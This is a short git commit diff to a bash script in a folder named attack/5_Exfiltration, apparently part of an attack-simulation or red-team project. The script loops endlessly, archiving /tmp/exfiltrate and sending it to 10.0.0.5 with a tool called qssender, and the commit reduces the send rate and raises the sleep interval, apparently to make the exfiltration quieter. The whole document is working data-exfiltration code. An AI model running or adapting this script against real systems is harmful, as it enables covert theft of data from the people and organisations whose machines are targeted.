b1e60ddee1894d9759c08402d5ff08247007366e
kevinnivekkevin <63487456+kevinnivekkevin@users.noreply.github.com>
2022-10-25 00:43:46 +0800

    Update run_qssender.sh

--- attack/5_Exfiltration/run_qssender.sh
+++ attack/5_Exfiltration/run_qssender.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 while :; do
    tar -zcvf /tmp/data.tar.gz /tmp/exfiltrate
-  /tmp/qssender send file -d 2 -l 0.0.0.0 -r 10.0.0.5 -s 50000 /tmp/data.tar.gz
-  sleep 60
+  /tmp/qssender send file -d 2 -l 0.0.0.0 -r 10.0.0.5 -s 500 /tmp/data.tar.gz
+  sleep 300
 done
